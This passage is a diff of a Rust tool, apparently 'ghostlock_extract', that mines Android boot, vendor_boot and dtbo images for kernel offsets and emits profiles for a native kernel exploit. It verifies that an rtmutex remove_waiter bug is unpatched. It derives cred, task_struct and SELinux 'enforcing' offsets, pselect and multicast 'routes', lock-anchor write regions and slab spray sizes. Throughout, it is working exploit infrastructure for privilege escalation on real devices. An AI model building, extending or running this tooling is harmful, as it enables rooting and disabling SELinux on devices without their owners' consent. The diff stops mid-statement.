@@ -10,22 +10,31 @@ use ghostlock_extract::anchor;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
+    MULTICAST_5X_BUFFER_SIZE, PSELECT_ROUTE_NFDS, WaiterLayout, derive_cred_5x,
+    derive_nf_logger_registration, derive_pselect_layout, ensure_rtmutex_43499_unpatched,
+    multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
+use ghostlock_extract::fact;
 use ghostlock_extract::family;
 use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
-use ghostlock_extract::iomem;
+use ghostlock_extract::dtbo;
+use ghostlock_extract::ikconfig;
 use ghostlock_extract::kallsyms;
 use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
+use ghostlock_extract::layout;
+use ghostlock_extract::options;
 use ghostlock_extract::payload;
 use ghostlock_extract::report;
+use ghostlock_extract::structs;
 use ghostlock_extract::symbols::{
-    kernel_layout_verified, kernel_struct_macro, resolve_structs, resolve_symbols,
+    kernel_layout_verified, kernel_struct_macro, loggers_anchor_fallback, resolve_structs,
+    resolve_symbols,
 };
-use ghostlock_extract::vendor_boot::recover_kernel_phys_from_vendor_boot;
+use ghostlock_extract::vendor_boot::{
+    recover_kernel_phys_from_vendor_boot, PhysOffsetSource,
+};
 
 #[derive(Parser, Debug)]
 #[command(
@@ -40,10 +49,6 @@ struct Cli {
     /// embedded kallsyms table is recovered from the kernel image
     #[arg(long)]
     kallsyms: Option<PathBuf>,
-    /// /proc/iomem text file (rooted device dump); when omitted a readable
-    /// /proc/iomem is used to derive kernel_phys_offset and kernel_phys_load
-    #[arg(long)]
-    iomem: Option<PathBuf>,
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
@@ -52,9 +57,14 @@ struct Cli {
     #[arg(long)]
     uefi: Option<PathBuf>,
     /// optional vendor_boot.img (MediaTek only); derive kernel physical load
-    /// AND offset from its header kernel_addr field.
+    /// from its header kernel_addr and the offset from its embedded DTB
     #[arg(long)]
     vendor_boot: Option<PathBuf>,
+    /// optional dtbo.img (MediaTek only); derive kernel_phys_offset from its
+    /// DTBs' /memory node when vendor_boot.img carries no embedded DTB (or is
+    /// not supplied)
+    #[arg(long)]
+    dtbo: Option<PathBuf>,
     /// kernel physical load address (hex or decimal); overrides defaults
     #[arg(long, value_parser = parse_int)]
     phys: Option<u64>,
@@ -64,7 +74,18 @@ struct Cli {
     /// route written to --format conf; defaults to the analysis suggestion
     #[arg(long, value_parser = ["tcp_zerocopy", "select_stack", "multicast_waiter", "sigreturn"])]
     route: Option<String>,
-    /// derive the route's lock-anchor region and emit it in --format conf
+    /// write the per-route feasibility verdicts as JSON (route, verdict,
+    /// numbers, chosen route); exit 7 signals ambiguity
+    #[arg(long)]
+    feasible_out: Option<PathBuf>,
+    /// write the option superset -- every feasible route with its geometry,
+    /// every named anchor candidate with its page-free placement, and the
+    /// page/auto/attested plans -- as JSON
+    #[arg(long)]
+    options_out: Option<PathBuf>,
+    /// derive the route's lock-anchor region and emit it in --format conf.
+    /// Any family; the profile carries it only when the route uses an anchor,
+    /// and the app asks page-vs-anchor before export.
     #[arg(long)]
     anchor: bool,
     /// treat every unresolved symbol as optional (emit 0)
@@ -80,6 +101,10 @@ struct Cli {
     /// and print a report instead of offsets
     #[arg(long)]
     analysis: bool,
+    /// with --format conf, print the per-key fact table (value/domain/source/
+    /// confidence) to stderr; the profile output is unchanged
+    #[arg(long)]
+    explain: bool,
     /// scan .bss for a usable lock-anchor region and report the
     /// route.select_stack.lock_anchor_* triple instead of offsets
     #[arg(long)]
@@ -91,6 +116,25 @@ struct Cli {
     /// acceptance test checks a known-good region
     #[arg(long)]
     anchor_symbol: Option<String>,
+    /// operator-supplied lock-anchor image offset; overrides the derived
+    /// candidate. Requires --anchor-bytes and --anchor-stride. Logged as not
+    /// derived; never emitted without the bytes/stride pair.
+    #[arg(long, value_parser = parse_int)]
+    anchor_image: Option<u64>,
+    /// operator-supplied lock-anchor usable length in bytes (must be >= stride)
+    #[arg(long, value_parser = parse_int)]
+    anchor_bytes: Option<u64>,
+    /// operator-supplied lock-anchor slot pitch in bytes
+    #[arg(long, value_parser = parse_int)]
+    anchor_stride: Option<u64>,
+    /// operator-supplied W1 scratch image offset (page-free); requires
+    /// --anchor and is emitted only when the value predicate holds
+    #[arg(long, value_parser = parse_int)]
+    w1_scratch_image: Option<u64>,
+    /// named W1 second region resolved from kallsyms (e.g. bm_pmd,
+    /// serial8250_ports, s3c24xx_serial_ports); requires --anchor
+    #[arg(long)]
+    w1_scratch_symbol: Option<String>,
     /// working directory for payload extraction and temp files; defaults to
     /// the system temp dir (pass an app-writable dir when running on Android)
     #[arg(long)]
@@ -206,6 +250,40 @@ fn resolve_kallsyms(
         .map_err(|err| ExtractError::kallsyms(err.to_string()))
 }
 
+/// `selinux_state`'s field offsets: from the image's BTF when present (and
+/// consistent), else the 5.10 release template. `None` = fail closed, the
+/// profile omits the block and the native keeps its release-derived layout.
+fn selinux_layout(btf: Option<&Btf>, release: &str) -> Option<(u32, u32, &'static str)> {
+    if let Some(btf) = btf {
+        let enforcing = btf.field("selinux_state", "enforcing")?;
+        let initialized = btf.field("selinux_state", "initialized")?;
+        if btf.field("selinux_state", "disabled").is_some() {
+            eprintln!(
+                "warning: selinux_state.disabled is present; the selinux block is omitted"
+            );
+            return None;
+        }
+        if enforcing != 0 || initialized >= 8 {
+            eprintln!(
+                "warning: unexpected selinux_state layout (enforcing {enforcing}, \
+                 initialized {initialized}); the selinux block is omitted"
+            );
+            return None;
+        }
+        return Some((enforcing, initialized, "btf"));
+    }
+    /* No BTF: only the 5.10 series has a template; 5.15/6.1 and 6.6/6.12 are
+     * BTF-carrying images, so a no-BTF member of those families fails closed. */
+    let mut parts = release.split('.');
+    let major: u32 = parts.next()?.parse().ok()?;
+    let minor: u32 = parts.next()?.parse().ok()?;
+    if major == 5 && minor == 10 {
+        Some((0, 2, "release-template"))
+    } else {
+        None
+    }
+}
+
 fn run(cli: &Cli) -> Result<i32> {
     let mut boot_path = cli.image.clone();
     let mut xbl_path = cli.xbl_config.clone();
@@ -277,37 +355,79 @@ fn run(cli: &Cli) -> Result<i32> {
         kernel_phys_load = cli.phys;
     }
 
-    // vendor_boot.img's kernel_addr field always supplies kernel_phys_load;
-    // kernel_phys_offset (the DRAM base) is only set when the alignment
-    // pattern proves it (see vendor_boot::classify) rather than merely
-    // being consistent with it, e.g. for MediaTek devices.
+    // vendor_boot.img (MediaTek): kernel_addr supplies kernel_phys_load, and
+    // the DTB in its dtb section supplies kernel_phys_offset from /memory.
+    // When the image carries no usable DTB, the header's text-align pattern
+    // is the fallback; dtbo.img names the same node when the bootloader takes
+    // the DTB from elsewhere (dtb_size == 0).
     let mut vendor_boot_phys_offset: Option<u64> = None;
-    if kernel_phys_load.is_none() {
-        if let Some(vb) = &cli.vendor_boot {
-            match recover_kernel_phys_from_vendor_boot(vb) {
-                Ok((load, Some(offset))) => {
-                    eprintln!(
-                        "info: vendor_boot; kernel_phys_load=0x{load:x} \
-                         kernel_phys_offset=0x{offset:x}"
-                    );
+    if let Some(vb) = &cli.vendor_boot {
+        match recover_kernel_phys_from_vendor_boot(vb) {
+            Ok(info) => {
+                if kernel_phys_load.is_none() {
+                    kernel_phys_load = Some(info.kernel_addr);
                     phys_source = "vendor_boot header (MediaTek)";
-                    kernel_phys_load = Some(load);
-                    vendor_boot_phys_offset = Some(offset);
-                }
-                Ok((load, None)) => {
                     eprintln!(
-                        "info: vendor_boot; kernel_phys_load=0x{load:x} \
-                         (MiB-aligned but not provably the DRAM base; \
-                         kernel_phys_offset left unset, pass --iomem or \
-                         --phys to supply it)"
+                        "info: vendor_boot; kernel_phys_load=0x{:x}",
+                        info.kernel_addr
                     );
-                    phys_source = "vendor_boot header (MediaTek)";
-                    kernel_phys_load = Some(load);
+                } else {
+                    eprintln!(
+                        "info: vendor_boot; kernel_addr=0x{:x} \
+                         (kernel_phys_load already resolved)",
+                        info.kernel_addr
+                    );
                 }
-                Err(err) => eprintln!(
-                    "warning: vendor_boot header parse failed: {err}; \
-                     trying other sources"
-                ),
+                if let Some(err) = &info.dtb_error {
+                    eprintln!("warning: vendor_boot embedded DTB unusable: {err}");
+                }
+                match info.source {
+                    PhysOffsetSource::EmbeddedDtb => {
+                        let offset = info.phys_offset.unwrap_or(0);
+                        eprintln!(
+                            "info: vendor_boot DTB /memory; \
+                             kernel_phys_offset=0x{offset:x}"
+                        );
+                        if let (Some(header), Some(dtb)) =
+                            (info.header_offset, info.phys_offset)
+                        {
+                            if header != dtb {
+                                eprintln!(
+                                    "warning: header alignment implies \
+                                     kernel_phys_offset=0x{header:x}; the DTB \
+                                     /memory node wins"
+                                );
+                            }
+                        }
+                    }
+                    PhysOffsetSource::HeaderAlignment => {
+                        let offset = info.phys_offset.unwrap_or(0);
+                        eprintln!(
+                            "info: vendor_boot header alignment; \
+                             kernel_phys_offset=0x{offset:x}"
+                        );
+                    }
+                    PhysOffsetSource::Unset => eprintln!(
+                        "info: vendor_boot; kernel_phys_offset not provable \
+                         (MiB-aligned kernel_addr and no usable embedded DTB); \
+                         pass --dtbo to supply it"
+                    ),
+                }
+                vendor_boot_phys_offset = info.phys_offset;
+            }
+            Err(err) => eprintln!(
+                "warning: vendor_boot parse failed: {err}; trying other sources"
+            ),
+        }
+    }
+    if vendor_boot_phys_offset.is_none() {
+        if let Some(dtbo_path) = &cli.dtbo {
+            match dtbo::memory_base_from_path(dtbo_path) {
+                Ok(base) => {
+                    eprintln!("info: dtbo /memory; kernel_phys_offset=0x{base:x}");
+                    vendor_boot_phys_offset = Some(base);
+                }
+                Err(err) => eprintln!("warning: dtbo parse failed: {err}"),
             }
         }
     }
@@ -325,35 +445,15 @@ fn run(cli: &Cli) -> Result<i32> {
         return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
     };
 
-    // DRAM base / linear-map offset, and (with the kallsyms delta) the kernel
-    // physical load, from /proc/iomem when available (rooted device or --iomem).
-    let mut kernel_phys_offset: Option<u64> = vendor_boot_phys_offset;
-    let iomem_info = match iomem::load(cli.iomem.as_deref()) {
-        Ok(info) => info,
-        Err(err) => {
-            eprintln!("warning: {err}");
-            None
-        }
-    };
-    if let Some(info) = iomem_info {
-        if let Some(dram_base) = info.dram_base {
-            kernel_phys_offset = Some(dram_base);
-        }
-        if kernel_phys_load.is_none() {
-            /* arch/arm64/kernel/setup.c: kernel_code.start = __pa_symbol(_text),
-             * so the "Kernel code" range already starts at the image's physical
-             * base. Subtracting (_stext - _text) here made every 5.10 value
-             * 0x10000 low (the reason `--phys` was needed as a workaround). */
-            if let Some(kc) = info.kernel_code_start {
-                eprintln!(
-                    "info: iomem; kernel_phys_load=0x{kc:x} kernel_phys_offset=0x{:x}",
-                    kernel_phys_offset.unwrap_or(0)
-                );
-                kernel_phys_load = Some(kc);
-                phys_source = "iomem";
-            }
-        }
-    }
+    /* The image's release scopes the series template/IKCONFIG predicate below. */
+    let release = boot.release();
+    /* /proc/iomem is deliberately not a source for the physical pair. Its
+     * "Kernel code" start is seeded from _text on some images and _stext on
+     * others (a per-image fact, not a release rule), and its System-RAM base
+     * is not memstart_addr (arm64 rounds that down to ARM64_MEMSTART_ALIGN).
+     * The load comes from xbl_config/uefi/vendor_boot or --phys; the offset
+     * from vendor_boot/dtbo, or stays null for the native's compiled default. */
+    let kernel_phys_offset: Option<u64> = vendor_boot_phys_offset;
 
     let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
     // stop early when remove_waiter() is fixed; --analysis reports it instead.
@@ -381,10 +481,46 @@ fn run(cli: &Cli) -> Result<i32> {
         );
     }
 
-    let release = boot.release();
+    // The shared template's scope is the series that produced it. The image's
+    // own embedded IKCONFIG is authoritative; the patch range is only the
+    // lowest-priority fallback for a blob-less image.
+    let kernel_config = match ikconfig::KernelConfig::from_image(&boot.kernel) {
+        Ok(config) => Some(config),
+        Err(err) => {
+            eprintln!("warning: embedded IKCONFIG unavailable: {err}");
+            None
+        }
+    };
+    let series = release
+        .as_deref()
+        .map(|release| ikconfig::series_5_10(kernel_config.as_ref(), release))
+        .unwrap_or(ikconfig::SeriesMatch::None {
+            reason: "boot image carries no release string".to_string(),
+        });
+    let series_matched = series.matched();
+    if release.as_deref().is_some_and(family::is_5_10) {
+        match &series {
+            ikconfig::SeriesMatch::Fingerprint { fingerprint } => eprintln!(
+                "info: series ikconfig:{fingerprint} (layout fingerprint matches the \
+                 measured 5.10 series)"
+            ),
+            ikconfig::SeriesMatch::PatchRange { range } => eprintln!(
+                "warning: series patch-range:{range} (no IKCONFIG); every template value \
+                 is a heuristic"
+            ),
+            ikconfig::SeriesMatch::None { reason } => eprintln!(
+                "warning: series none: {reason}; template fields stay null"
+            ),
+        }
+        if let Some(config) = &kernel_config {
+            eprintln!("info: IKCONFIG full hash {}", config.full_hash());
+        }
+    }
     match release.as_deref() {
         Some(release) => {
-            if !kernel_layout_verified(Some(release)) {
+            // 5.10 route geometry is derived from the image, so the 6.x
+            // "unverified family" warning would misstate what was emitted.
+            if !kernel_layout_verified(Some(release)) && !family::is_5_10(release) {
                 let template = kernel_struct_macro(Some(release));
                 eprintln!(
                     "warning: {release} is unverified{}; no family-derived \
@@ -423,6 +559,11 @@ fn run(cli: &Cli) -> Result<i32> {
             );
         }
     }
+    /* One canonical line for the app: which source supplied the physical pair.
+     * The parse flow uses it to decide whether to ask for the next recommended
+     * image (xbl_config -> uefi, vendor_boot -> dtbo). */
+    eprintln!("info: phys_source={phys_source}");
+
     if cli.anchor && cli.format != "conf" {
         eprintln!("warning: --anchor only affects --format conf; ignoring");
     }
@@ -444,6 +585,14 @@ fn run(cli: &Cli) -> Result<i32> {
             allow_disasm: !cli.no_disasm,
         });
         let text = analysis::render(&analysis_report);
+        if let Some(path) = &cli.feasible_out {
+            write_feasible_out(
+                path,
+                release.as_deref().unwrap_or(""),
+                &analysis_report.verdicts,
+                analysis_report.suggestion,
+            )?;
+        }
         if let Some(out) = &cli.out {
             std::fs::write(out, text).map_err(|err| ExtractError::new(format!("{err}")))?;
         } else {
@@ -470,86 +619,125 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
-    // Infeasible pselect geometry only rules out the select_stack route; it is
-    // recorded here and re-checked after route selection instead of aborting.
-    let mut pselect_infeasible: Option<String> = None;
-    if !cli.no_disasm {
-        if let Some(btf) = &btf {
-            match derive_pselect_layout(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                btf,
-                PSELECT_ROUTE_NFDS,
-            ) {
-                Ok(layout) => {
-                    let shift = layout.shift as i64 - 2;
-                    let frame_parts: Vec<String> = [
-                        "frame_pselect_wrapper",
-                        "frame_pselect_dispatch",
-                        "frame_pselect_core",
-                        "frame_futex_wrapper",
-                        "frame_futex_dispatch",
-                        "frame_futex_wait",
-                    ]
-                    .iter()
-                    .filter_map(|key| {
-                        layout.frames.get(*key).map(|value| {
-                            format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
-                        })
+    let release_major = release
+        .as_deref()
+        .and_then(|release| release.split('.').next())
+        .and_then(|part| part.parse::<u32>().ok());
+    // The pselect derivation runs for every image with BTF, and for a 5.10
+    // image without it (the waiter layout is a 5.10 codegen constant). A
+    // derivation failure is Unknown; only a geometric impossibility is
+    // Infeasible.
+    let pselect_outcome = if cli.no_disasm {
+        analysis::PselectOutcome::NotAttempted("--no-disasm")
+    } else if btf.is_some() || release_major == Some(5) {
+        match derive_pselect_layout(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+            PSELECT_ROUTE_NFDS,
+        ) {
+            Ok(layout) => {
+                let shift = layout.shift as i64 - 2;
+                let frame_parts: Vec<String> = [
+                    "frame_pselect_wrapper",
+                    "frame_pselect_dispatch",
+                    "frame_pselect_core",
+                    "frame_futex_wrapper",
+                    "frame_futex_dispatch",
+                    "frame_futex_wait",
+                ]
+                .iter()
+                .filter_map(|key| {
+                    layout.frames.get(*key).map(|value| {
+                        format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
                     })
-                    .collect();
-                    eprintln!(
-                        "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
-                         shift={shift} (derived {} - 2)",
-                        layout.chain,
-                        frame_parts.join(" "),
-                        layout.pselect_buffer,
-                        layout.waiter_local,
-                        layout.shift,
-                    );
-                    derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
-                }
-                Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
-                    pselect_infeasible = Some(message);
-                }
-                Err(err) => {
-                    eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
-                }
+                })
+                .collect();
+                eprintln!(
+                    "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
+                     shift={shift} (derived {} - 2)",
+                    layout.chain,
+                    frame_parts.join(" "),
+                    layout.pselect_buffer,
+                    layout.waiter_local,
+                    layout.shift,
+                );
+                analysis::PselectOutcome::Derived(Box::new(layout))
             }
-            match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
-                Ok(info) => {
-                    derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
-                    eprintln!(
-                        "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}",
-                        info.loggers, info.nfulnl_logger, info.nf_log_type_ulog, info.loggers_0_1
-                    );
-                }
-                Err(err) => {
-                    eprintln!("warning: loggers_0_1 derivation failed: {err}");
-                }
+            Err(ExtractError::Infeasible { message, numbers }) => {
+                eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                analysis::PselectOutcome::Infeasible { message, numbers }
             }
-        } else {
-            eprintln!("warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic");
+            Err(err) => {
+                eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
+                analysis::PselectOutcome::Failed(err.to_string())
+            }
         }
     } else {
-        eprintln!(
-            "warning: --no-disasm; pselect_waiter_shift and loggers_0_1 fall back to \
-             heuristics"
-        );
+        analysis::PselectOutcome::NotAttempted("no embedded BTF")
+    };
+
+    if !cli.no_disasm {
+        match derive_nf_logger_registration(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+        ) {
+            Ok(info) => {
+                derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
+                eprintln!(
+                    "info: nf_logger loggers={:#x} nfulnl_logger={:#x} ulog={} slot={:#x}{}",
+                    info.loggers,
+                    info.nfulnl_logger,
+                    info.nf_log_type_ulog,
+                    info.loggers_0_1,
+                    if btf.is_none() {
+                        " (no BTF; structure verified, measured anchor)"
+                    } else {
+                        ""
+                    }
+                );
+            }
+            Err(err) => eprintln!("warning: nf_logger derivation failed: {err}"),
+        }
+    } else {
+        eprintln!("info: --no-disasm; nf_logger uses the family fallback");
     }
 
-    let pselect_shift = derived
-        .get("pselect_waiter_shift_value")
-        .copied()
-        .map(|value| value as i64)
-        .or_else(|| {
-            // An infeasible derivation means this image's layout does not exist;
-            // a family default would be wrong, so it is not substituted.
-            if pselect_infeasible.is_some() {
-                return None;
+    /* `resolve_symbols` seeds the measured 5.10 anchor (`loggers+0x10`). Do
+     * not let that constant reach another family: when the derivation did not
+     * close, BTF supplies the enum index, 5.10 keeps the measured constant, and
+     * every other family omits the field rather than shipping a foreign one. */
+    if !derived.contains_key("off_slide_loggers_0_1") {
+        let loggers =
+            kallsyms::unique(&symbols, "loggers").and_then(|value| value.checked_sub(base));
+        let ulog = btf
+            .as_ref()
+            .and_then(|btf| btf.enum_value("nf_log_type", "NF_LOG_TYPE_ULOG"));
+        let (fallback, source) = loggers_anchor_fallback(
+            loggers,
+            ulog,
+            release.as_deref().is_some_and(family::is_5_10),
+        );
+        symbol_offsets.insert("off_slide_loggers_0_1".to_string(), fallback);
+        match source {
+            "btf-enum" => eprintln!(
+                "info: nf_logger anchor loggers+{:#x} from the BTF enum",
+                ulog.unwrap_or(0) as u64 * 8
+            ),
+            "heuristic-5.10" => {
+                eprintln!("warning: nf_logger anchor uses the measured 5.10 heuristic loggers+0x10")
             }
+            _ => eprintln!("warning: nf_logger anchor omitted; no BTF enum and no family fallback"),
+        }
+    }
+
+    let pselect_shift = match &pselect_outcome {
+        analysis::PselectOutcome::Derived(layout) => Some(layout.shift as i64 - 2),
+        _ if release_major == Some(5) => None,
+        _ => {
             let shift = report::pselect_waiter_shift_for(release.as_deref());
             if let Some(shift) = shift {
                 eprintln!(
@@ -563,21 +751,105 @@ fn run(cli: &Cli) -> Result<i32> {
                 );
             }
             shift
-        });
+        }
+    };
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
     let mut struct_offsets = resolve_structs(btf.as_ref());
+    let mut field_sources: BTreeMap<String, String> = BTreeMap::new();
+    // Per-image derivation first: init_task and copy_process locate the fields
+    // the image itself can prove. A field that does not close stays absent.
+    if btf.is_none() && cli.format == "conf" && !cli.no_disasm {
+        let init_task = kallsyms::unique(&symbols, "init_task");
+        let init_cred = kallsyms::unique(&symbols, "init_cred");
+        let root_task_group = kallsyms::unique(&symbols, "root_task_group");
+        if let (Some(init_task_va), Some(init_task_off)) = (
+            init_task,
+            symbol_offsets.get("off_init_task").copied().flatten(),
+        ) {
+            let derived = structs::derive_task_struct_5_10(
+                &boot.kernel,
+                &rel_symbols,
+                &sorted_offsets,
+                init_task_off,
+                init_task_va,
+                init_cred.unwrap_or(0),
+                root_task_group.unwrap_or(0),
+            );
+            if !derived.values.is_empty() {
+                for (name, value) in &derived.values {
+                    struct_offsets.insert((*name).to_string(), Some(*value));
+                    if let Some(source) = derived.sources.get(name) {
+                        field_sources.insert((*name).to_string(), format!("derived:{source}"));
+                    }
+                }
+                eprintln!(
+                    "info: no BTF; task_struct derived from the image ({} fields)",
+                    derived.values.len()
+                );
+            }
+        }
+    }
     // The template fills the profile contract, not the diagnostic report: the
-    // JSON/text formats keep showing what the image itself yielded.
-    if btf.is_none() && cli.format == "conf" {
-        if let Some(release) = release
-            .as_deref()
-            .filter(|release| family::matches(release))
-        {
-            family::apply_structs(&mut struct_offsets);
+    // JSON/text formats keep showing what the image itself yielded. It fills
+    // only inside the measured series and only the fields the derivation did
+    // not close; a fingerprint mismatch leaves the rest null.
+    if btf.is_none() && cli.format == "conf" && series_matched {
+        for (name, template_value) in family::TASK_FIELDS {
+            match struct_offsets.get(*name).copied().flatten() {
+                Some(derived) if derived != *template_value => eprintln!(
+                    "warning: derived {name}={derived} differs from the measured-series \
+                     template {template_value}; using derived"
+                ),
+                Some(_) => {}
+                None => {
+                    struct_offsets.insert((*name).to_string(), Some(*template_value));
+                    let source = if series.is_heuristic() {
+                        format!("template:{} heuristic", series.label())
+                    } else {
+                        format!("template:{}", series.label())
+                    };
+                    field_sources.insert((*name).to_string(), source);
+                }
+            }
+        }
+        eprintln!(
+            "info: no BTF; task_struct template filled the remaining fields ({})",
+            series.label()
+        );
+        if series.is_heuristic() {
             eprintln!(
-                "info: no BTF; task_struct filled from the diting 5.10 family template ({release})"
+                "warning: task_struct values are heuristic (patch-range series, no IKCONFIG)"
+            );
+        }
+    }
+    // Per-field provenance for the generation log. The app copies these lines
+    // into the parse entry's meta; a later disagreement is reviewable without
+    // re-running the extractor.
+    if btf.is_none() && cli.format == "conf" {
+        for name in struct_offsets.keys() {
+            let source = field_sources.get(name).map(String::as_str).unwrap_or("null");
+            eprintln!("info: field_source {name}={source}");
+        }
+    }
+
+    let route_verdicts = analysis::route_verdicts(
+        &boot.kernel,
+        &rel_symbols,
+        &sorted_offsets,
+        btf.as_ref(),
+        &pselect_outcome,
+        !cli.no_disasm,
+        release_major,
+    );
+    if cli.format == "conf" {
+        for verdict in &route_verdicts {
+            eprintln!(
+                "info: route {} {}: {}",
+                verdict.route,
+                verdict.verdict.label(),
+                verdict.reason
             );
         }
     }
@@ -635,14 +907,20 @@ fn run(cli: &Cli) -> Result<i32> {
     }
     if let Some(mm_size) = struct_offsets.get("struct_mm_struct").copied().flatten() {
         eprintln!(
-            "info: sizeof(mm_struct)=0x{mm_size:X} (MM_STRUCT_SZ=0x500 in src/core/common.h)"
+            "info: sizeof(mm_struct)=0x{mm_size:X} (native spray default MM_STRUCT_SZ=0x500)"
         );
         if mm_size > 0x500 {
-            eprintln!("warning: sizeof(mm_struct) exceeds the hardcoded MM_STRUCT_SZ slab stride");
+            eprintln!("warning: sizeof(mm_struct) exceeds the native MM_STRUCT_SZ default (0x500)");
         }
     }
 
     let btf_size = btf_raw.as_ref().map(|b| b.len()).unwrap_or(0);
+    if cli.explain && cli.format != "conf" {
+        eprintln!("warning: --explain is only meaningful with --format conf; ignoring");
+    }
+    if cli.options_out.is_some() && cli.format != "conf" {
+        eprintln!("warning: --options-out is only meaningful with --format conf; ignoring");
+    }
     let output = if cli.format == "conf" {
         let release_text = release
             .as_deref()
@@ -659,117 +937,342 @@ fn run(cli: &Cli) -> Result<i32> {
         // Candidate output: emit everything the image actually yielded and
         // leave the rest out. Whether the result is complete enough to run is
         // decided by the app's pre-execution validation, not here.
-        let route = match cli.route.as_deref() {
-            Some(route) => Some(route.to_string()),
-            None => {
-                match family::route_hint(&boot.kernel, &rel_symbols, &sorted_offsets, release_text)
-                {
-                    // The diting 5.10 line has a physical discriminator:
-                    // do_futex's frame depth decides whether select_stack is in
-                    // band.
-                    Some((hint, reason)) => {
-                        eprintln!("info: {reason}");
-                        Some(hint.to_string())
-                    }
-                    None => {
-                        let paths = analysis::probe_paths(
-                            &symbols,
-                            &boot.kernel,
-                            &rel_symbols,
-                            &sorted_offsets,
+        if cli.no_disasm && cli.route.is_none() {
+            return Err(ExtractError::new(
+                "--no-disasm with --format conf requires --route",
+            ));
+        }
+        /* With `--options-out` an ambiguous pass still has to reach the common
+         * facts so the superset can carry a cuttable profile; it exits 7 after
+         * writing the document instead of returning here. */
+        let mut ambiguous = false;
+        let route = if let Some(forced) = cli.route.as_deref() {
+            match route_verdicts
+                .iter()
+                .find(|verdict| verdict.route == forced)
+            {
+                Some(verdict) if verdict.verdict == analysis::Feasibility::Infeasible => {
+                    eprintln!(
+                        "error: forced route {forced} is infeasible on this kernel: {}",
+                        verdict.reason
+                    );
+                    return Ok(3);
+                }
+                Some(verdict) => {
+                    if verdict.verdict == analysis::Feasibility::Unknown {
+                        eprintln!(
+                            "warning: forced route {forced} is unverified (unknown): {}",
+                            verdict.reason
                         );
-                        let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
-                        let (suggested, _, _) =
-                            analysis::suggest_route(pselect_derived, &paths, release.as_deref());
-                        suggested.map(str::to_string)
                     }
+                    Some(forced.to_string())
+                }
+                None => {
+                    eprintln!("error: unknown route {forced}");
+                    return Ok(3);
+                }
+            }
+        } else {
+            /* The fallback nomination: the 5.10 frame rule, or the family
+             * heuristic for the other families. The verdict set decides first;
+             * the nomination only breaks a zero-feasible tie. */
+            let fallback = if release_major == Some(5) {
+                family::route_hint(
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                    release_text,
+                )
+            } else {
+                let paths = analysis::probe_paths(
+                    &symbols,
+                    &boot.kernel,
+                    &rel_symbols,
+                    &sorted_offsets,
+                );
+                let pselect_derived =
+                    matches!(pselect_outcome, analysis::PselectOutcome::Derived(_));
+                let (suggested, _, reasons) = analysis::suggest_route(
+                    pselect_derived,
+                    &paths,
+                    release.as_deref(),
+                );
+                suggested.map(|route| {
+                    (route, reasons.first().cloned().unwrap_or_default())
+                })
+            };
+            match analysis::select_route(&route_verdicts, fallback) {
+                analysis::RouteSelection::Chosen {
+                    route,
+                    basis,
+                    reason,
+                } => {
+                    eprintln!("info: route {route} selected ({basis:?}): {reason}");
+                    Some(route.to_string())
+                }
+                analysis::RouteSelection::Ambiguous { routes } => {
+                    if let Some(path) = &cli.feasible_out {
+                        write_feasible_out(path, release_text, &route_verdicts, None)?;
+                    }
+                    eprintln!(
+                        "error: more than one feasible route ({}); pass --route",
+                        routes.join(", ")
+                    );
+                    if cli.options_out.is_some() {
+                        ambiguous = true;
+                        None
+                    } else {
+                        return Ok(7);
+                    }
+                }
+                analysis::RouteSelection::None { reason } => {
+                    eprintln!("warning: {reason}");
+                    None
                 }
             }
         };
+        if let Some(path) = &cli.feasible_out {
+            write_feasible_out(path, release_text, &route_verdicts, route.as_deref())?;
+        }
         // select_stack is the only route that needs the derived pselect layout;
-        // reject it here, after selection, so tcp/multicast can still proceed.
-        if route
-            .as_deref()
-            .is_some_and(analysis::route_depends_on_pselect_layout)
+        // the 5.10 path already refused a forced Infeasible route, so this is
+        // the pre-5.10 (family) path.
+        if release_major != Some(5)
+            && route
+                .as_deref()
+                .is_some_and(analysis::route_depends_on_pselect_layout)
         {
-            if let Some(message) = &pselect_infeasible {
+            if let analysis::PselectOutcome::Infeasible { message, .. } = &pselect_outcome {
                 eprintln!("error: pselect route not feasible on this kernel: {message}");
                 return Ok(3);
             }
         }
+        let route_shift = if route.as_deref() == Some("select_stack") {
+            pselect_shift.or_else(|| {
+                if release_major == Some(5) {
+                    eprintln!(
